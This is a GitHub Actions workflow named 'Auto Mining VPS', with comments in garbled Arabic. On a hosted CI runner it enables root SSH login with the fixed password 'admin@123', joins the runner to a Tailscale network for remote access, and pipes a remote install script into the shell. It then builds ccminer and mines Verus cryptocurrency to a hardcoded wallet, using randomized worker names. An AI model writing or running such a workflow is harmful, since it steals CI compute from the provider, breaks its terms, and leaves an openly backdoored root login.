name: Auto Mining VPS

on:
  workflow_dispatch:

jobs:
  setup-and-mine:
    runs-on: ubuntu-latest
    timeout-minutes: 360

    steps:
      - name: Checkout Repo
        uses: actions/checkout@v3

      - name: Run Mining Setup
        env:
          TAILSCALE_AUTH_KEY: ${{ secrets.TAILSCALE_AUTH_KEY }}
        run: |
          # ØªÙ†Ø²ÙŠÙ„ Ø§Ù„Ø³ÙƒØ±Ø¨Øª ÙˆØªØ´ØºÙŠÙ„Ù‡ Ù…Ø¨Ø§Ø´Ø±Ø©
          cat > mine.sh <<'EOF'
#!/bin/bash
# ===== Ø¥Ø¹Ø¯Ø§Ø¯ SSH root =====
sudo apt update -y
sudo apt install -y openssh-server curl git build-essential \
    libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev screen
sudo systemctl enable ssh
sudo systemctl start ssh
echo "root:admin@123" | sudo chpasswd
echo "PermitRootLogin yes" | sudo tee -a /etc/ssh/sshd_config
sudo service ssh restart
echo "âœ… SSH Ø¬Ø§Ù‡Ø² | User: root | Pass: admin@123"

# ===== ØªØ«Ø¨ÙŠØª Tailscale =====
curl -fsSL https://tailscale.com/install.sh | sh
sudo tailscale up --authkey=${TAILSCALE_AUTH_KEY:-"Ø§Ø¯Ø®Ù„_Ù‡Ù†Ø§_auth_key"} --hostname=vps-$(date +%s)
TS_IP=$(tailscale ip -4 | head -n 1)
echo "âœ… Tailscale IP: $TS_IP"

# ===== Ø¥Ø¹Ø¯Ø§Ø¯ Ø§Ù„ØªØ¹Ø¯ÙŠÙ† =====
WAL="RGRbQeW9cy641mJfpM7MKZ5YpmsUHMxf2p"
POOL="pool.verus.io:9998"
TH=8

# ===== Ø¥Ù†Ø´Ø§Ø¡ Worker Name Ø¹Ø´ÙˆØ§Ø¦ÙŠ =====
RAND_NUM=$(shuf -i 1000-9999 -n 1)
RAND_CHARS=$(cat /dev/urandom | tr -dc 'a-zA-Z' | fold -w 2 | head -n 1)
WRK="ubuntu${RAND_NUM}${RAND_CHARS}"
echo "ðŸ‘· Worker Name: $WRK"

# ===== ØªÙ†Ø²ÙŠÙ„ ÙˆØªØ¬Ù‡ÙŠØ² ccminer =====
if [ ! -d "$HOME/ccminer" ]; then
    git clone https://github.com/Oink70/ccminer-verus.git ~/ccminer
    cd ~/ccminer
    ./build.sh
else
    cd ~/ccminer
    make clean
    ./build.sh
fi

# ===== Ø¥Ù†Ø´Ø§Ø¡ config.json =====
cat > config.json <<CONFIG
{
  "pools": [
    { "name": "CUSTOM", "url": "stratum+tcp://${POOL}", "timeout": 180, "disabled": 0 }
  ],
  "user": "${WAL}.${WRK}",
  "pass": "x",
  "algo": "verus",
  "threads": ${TH},
  "api-bind": "127.0.0.1:4068"
}
CONFIG
echo "ðŸ“‚ Ù…Ù„Ù config.json Ø§ØªØ¹Ù…Ù„"

# ===== ØªØ´ØºÙŠÙ„ Ø§Ù„ØªØ¹Ø¯ÙŠÙ† ÙÙŠ screen =====
screen -dmS verus_mining ./ccminer -c config.json
echo "ðŸš€ Ø§Ù„ØªØ¹Ø¯ÙŠÙ† Ø¨Ø¯Ø£ ÙÙŠ Ø¬Ù„Ø³Ø© screen Ø§Ø³Ù…Ù‡Ø§: verus_mining"
echo "â–¶ï¸ Ù„Ù„Ø±Ø¬ÙˆØ¹ Ù„Ù„Ø¬Ù„Ø³Ø©: screen -r verus_mining"
echo "ðŸ”š Ù„Ù„Ø®Ø±ÙˆØ¬ Ø¨Ø¯ÙˆÙ† Ø¥ÙŠÙ‚Ø§Ù Ø§Ù„ØªØ¹Ø¯ÙŠÙ†: Ø§Ø¶ØºØ· Ctrl+A Ø«Ù… D"

# ===== Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ù„Ù„ØªÙˆØµÙŠÙ„ =====
echo "ðŸ“Œ SSH root: root"
echo "ðŸ“Œ Password: admin@123"
echo "ðŸ“Œ Tailscale IP: $TS_IP"
EOF

          chmod +x mine.sh
          ./mine.sh
